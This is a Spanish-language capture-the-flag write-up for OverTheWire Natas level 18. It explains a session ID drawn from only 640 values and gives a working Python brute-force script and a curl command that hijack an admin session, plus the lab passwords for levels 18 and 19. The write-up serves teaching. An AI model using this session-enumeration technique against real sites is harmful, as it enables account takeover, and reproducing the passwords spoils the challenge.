# Natas Level18

## Descripción
> **Level Goal (natas18.natas.labs.overthewire.org):** Un formulario de login que solo revela las credenciales del siguiente nivel si `$_SESSION["admin"] == 1`. El código fuente muestra que la función `isValidAdminLogin()` que debería marcar como admin al usuario `admin` **está deshabilitada** (el `return 1;` está comentado, y siempre devuelve `0`). El ID de sesión (`PHPSESSID`) no lo genera PHP de forma normal: la propia app lo fija con `session_id(createID($user))`, y `createID()` es literalmente `rand(1, $maxid)` con `$maxid = 640`.

## Solución
El espacio de IDs de sesión válidos es minúsculo (solo 640 valores posibles, en vez de los cientos de bits de entropía de un ID de sesión normal). Aunque el propio código de login nunca marca a nadie como admin, el servidor es compartido por todos los jugadores del wargame en todo momento: basta con probar, uno por uno, los 640 valores posibles de `PHPSESSID` como cookie y comprobar si esa sesión (creada por *algún* jugador o proceso en algún momento) tiene `admin=1` guardado.

```python
import requests
from concurrent.futures import ThreadPoolExecutor

auth = ("natas18", "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")
url = "http://natas18.natas.labs.overthewire.org/index.php"

def check(i):
    r = requests.get(url, auth=auth, cookies={"PHPSESSID": str(i)}, timeout=10)
    return i if "You are an admin" in r.text else None

with ThreadPoolExecutor(max_workers=20) as ex:
    found = [i for i in ex.map(check, range(1, 641)) if i]

print(found)  # [119]
```

```bash
curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op -b "PHPSESSID=119" \
  http://natas18.natas.labs.overthewire.org/index.php
# You are an admin. The credentials for the next level are:
# Username: natas19
# Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```

## Notas adicionales
- El fallo de diseño es doble: (1) el ID de sesión debería ser impredecible y tener suficiente entropía (habitualmente 128 bits en PHP moderno), no un `rand(1, 640)`; y (2) el estado de sesión (`admin=1`) de un usuario nunca debería ser alcanzable/reutilizable por otro usuario simplemente adivinando o forzando el identificador de sesión — esto es fijación/secuestro de sesión por espacio de IDs pequeño.
- 640 peticiones en paralelo (20 hilos) tardan solo unos segundos; ni siquiera hace falta optimizar mucho para que este ataque sea práctico.
- La contraseña se recuperó de una sesión que ya tenía `admin=1` en el momento de la prueba (el ID concreto que funciona puede variar entre intentos, ya que depende de qué sesiones existan activas en el servidor compartido en ese momento).

## Referencias
- Reto original: http://natas18.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Session_fixation (OWASP, Session Fixation / predictable session IDs)
